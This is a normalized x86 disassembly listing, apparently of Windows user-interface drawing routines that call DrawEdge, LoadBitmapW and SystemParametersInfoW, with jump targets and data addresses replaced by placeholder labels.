mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x55 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x55 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x32 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x14 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x50 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x20 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4b ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x49 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
mov edx 0xff00000d
call sub_44cd1c
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x18 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x20 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
mov edx 0xff00000f
call sub_44cd1c
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
mov eax [ eax + 0x10 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x50 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_453b68
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
call sub_44ccf0
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x2c ]
sub eax [ edx + 0x38 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x2c ]
add eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x10 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
movzx eax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x38 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x56 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x4a ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x18 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x20 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_450824
mov edx [ ebp + 0x8 ]
mov [ edx - 0x54 ] eax
xor eax eax
push ebp
push sub_45e092
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x7ff8
push 0x0
call LoadBitmapW
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
call sub_4520c4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x50 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x40 ]
mov edx 0xff000012
call sub_44c1c8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0x1c ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
call sub_4892a4
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x50 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x48 ]
call sub_44cd1c
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x1c ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x4b ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x33 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_45c330
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x48 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x3c ]
mov eax [ ebp + 0x8 ]
sub ecx [ eax - 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0xc ]
sub ecx eax
sar ecx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x40 ]
movzx edx [ r-xdata ]
call sub_44c590
mov eax [ ebp + 0x8 ]
or [ eax - 0x38 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_44df24
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov ebx [ eax ]
call [ ebx + 0x80 ]
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x48 ]
lea edi [ edx - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x18 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x20 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
movzx eax [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
call sub_4899c8
jmp r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
xor edx edx
call sub_40ac74
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc ecx 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_44df24
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x14 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0x1c ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x1c ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x1c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x50 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x40 ]
call sub_44c1c8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
call sub_4055f0
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x33 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov ecx [ eax + 0x34 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
call sub_45c330
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x33 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
or ecx 0xffffffff
xor edx edx
call sub_40ac74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e582
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x55 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x57 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
xor ecx ecx
mov edx 0x1
call sub_40ac74
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
movzx eax [ eax + 0x60 ]
call sub_45b1f0
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_44cfbc
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x33 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov ecx [ ebp - 0x4 ]
call sub_45c330
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
cmp [ eax + 0x5c ] 0x0
jne r-xdata
sub_45e646
add [ ebx - 0x7c2f0100 ] cl
clc
add [ ebx ] ebx
rol [ eax - 0x78 ] 0x45
mov dh 0xeb
add al 0xc6
inc ebp
mov dh 0x0
cmp [ ebp - 0x30 ] 0x0
je r-xdata
xor ebx ebx
xor edx edx
mov eax 0x6
call sub_417224
mov [ ebp - 0x57 ] al
cmp [ ebp - 0x57 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
cmp [ eax + 0x40 ] 0x0
jne r-xdata
test ebx ebx
je r-xdata
call sub_485c78
mov dl 0x7
call sub_485d44
mov ebx eax
mov eax [ ebp - 0x24 ]
cmp [ eax + 0x9a ] 0x0
jne r-xdata
cmp [ ebp - 0x2c ] 0x0
je r-xdata
cmp [ ebp - 0x30 ] 0x0
je r-xdata
push ebp
cmp [ ebp - 0x30 ] 0x0
je r-xdata
movzx eax [ ebp - 0x33 ]
push eax
lea ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x24 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov eax [ ebp - 0x24 ]
cmp [ eax + 0x9a ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
cmp [ eax + 0x92 ] 0x0
je r-xdata
push ebp
call sub_45dbfc
pop ecx
mov eax [ ebp - 0x30 ]
call sub_4612dc
test al al
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x30 ]
call sub_4612dc
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ ebp + 0xc ]
push eax
mov ebx [ ebp - 0x24 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
jmp r-xdata
push ebp
call sub_45d27c
pop ecx
jmp r-xdata
call sub_45c818
pop ecx
jmp r-xdata
mov al 0x1
sub_45e754
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_45f5a8
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_45e784
push ebp
mov ebp esp
add esp 0xfffffe08
call sub_40c7e4
mov [ ebp - 0x1f8 ] eax
push 0x0
lea eax [ ebp - 0x1f8 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoW
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp - 0x120 ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x11c ]
mov [ eax ] edx
sub_45e7d0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
xor eax eax
mov [ ebp - 0x24 ] eax
mov ebx [ ebp + 0x8 ]
add ebx 0xffffffe0
xor eax eax
push ebp
push sub_45eb91
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
xor edx edx
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
xor edx edx
mov [ eax ] edx
lea eax [ ebp - 0x10 ]
push eax
push 0x1
push 0x0
mov eax [ ebx ]
movzx eax [ eax + 0x3d ]
mov edx [ ebx ]
movzx edx [ edx + 0x39 ]
lea edx [ edx * 8 + rw-data ]
mov eax [ edx + eax * 4 ]
push eax
push 0xb
mov eax [ ebx ]
call sub_45c284
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x24 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x24 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x34 ]
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x25 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x38 ]
cmp eax [ ebp - 0x10 ]
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xc ]
add [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0xe12
mov eax [ ebx ]
movzx eax [ eax + 0x3d ]
mov edx [ ebx ]
movzx edx [ edx + 0x39 ]
lea edx [ edx * 8 + rw-data ]
mov eax [ edx + eax * 4 ]
push eax
push 0xb
mov eax [ ebx ]
call sub_45c284
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x18 ]
add eax [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
add [ edx ] eax
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x1c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x18 ]
add [ edx ] eax
lea eax [ ebp - 0x8 ]
push eax
push 0x1
push 0x0
push 0x0
push 0xd
mov eax [ ebx ]
call sub_45c284
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp - 0x8 ]
add [ eax ] edx
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0xe11
push 0x0
push 0xd
mov eax [ ebx ]
call sub_45c284
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x1c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x18 ]
add [ edx ] eax
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0xe11
push 0x1
push 0xe
mov eax [ ebx ]
call sub_45c284
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x20 ]
add eax [ ebp - 0x1c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x18 ]
add [ edx ] eax
lea eax [ ebp - 0x8 ]
push eax
push 0x1
push 0x0
push 0x1
push 0x10
mov eax [ ebx ]
call sub_45c284
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp - 0x8 ]
add [ eax ] edx
mov eax [ ebx ]
mov eax [ eax + 0x34 ]
mov edx r-xdata
call sub_407768
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x24 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x24 ]
mov eax [ eax + 0x38 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
xor ecx ecx
mov edx 0x10
call sub_404c14
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x2c ] 0x0
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x1
push 0x0
push 0x0
push 0xf
mov eax [ ebx ]
call sub_45c284
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x20 ]
push eax
push 0x0
push 0xe11
push 0x0
push 0xf
mov eax [ ebx ]
call sub_45c284
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp - 0x4 ]
add eax [ ebp - 0x14 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp - 0x8 ]
add [ eax ] edx
mov eax [ ebx ]
cmp [ eax + 0x4c ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x40 ] 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x2d ] 0x0
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0x1
push 0x0
push 0x1
push 0x8
mov eax [ ebx ]
call sub_45c284
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0x4 ]
add [ eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp - 0x10 ]
add [ eax ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x2d ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x2c ]
movzx eax [ eax + 0x68 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x2d ] al
jmp r-xdata
mov eax [ ebx ]
movzx esi [ eax + 0x60 ]
test si si
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffcc
mov edx [ ebx ]
mov edx [ edx + 0x34 ]
call sub_4070fc
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_45b1f0
mov ecx [ ebp - 0x24 ]
mov eax [ ebx ]
mov edx [ eax + 0x34 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffcc
call sub_407564
jmp r-xdata
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x2d ]
movzx eax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x38 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x34 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x3c ]
mov eax [ ebx ]
call sub_45c61c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x18 ]
add [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45eb98
lea eax [ ebp - 0x24 ]
call j_sub_4068a0
retn
sub_45eba7
inc [ ecx ]
add [ eax ] al
add [ 0x55000000 ] ch
mov ebp esp
add esp 0xffffffc0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x3c ] edx
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_45ee0a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x20 ]
mov si 0xfff2
call sub_40587c
mov edx [ r-xdata ]
call sub_40580c
test al al
je r-xdata
mov [ ebp - 0x25 ] 0x0
mov [ ebp - 0x25 ] 0x1
push ebp
call sub_45e784
pop ecx
jmp r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
call sub_485c78
mov dl 0x7
call sub_485d44
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
call sub_45e754
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x20 ]
call sub_45f5a8
mov [ ebp - 0x2c ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor edx edx
mov eax 0x6
call sub_417224
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax + 0x34 ]
mov edx r-xdata
call sub_407768
jne r-xdata
push ebp
call sub_45e7d0
pop ecx
jmp r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x18 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x20 ]
cmp [ eax + 0xa2 ] 0x0
je r-xdata
mov eax [ ebp - 0x20 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
cmp [ eax + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ee11
lea eax [ ebp - 0x40 ]
call j_sub_4068a0
lea eax [ ebp - 0x34 ]
call j_sub_4068a0
retn
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
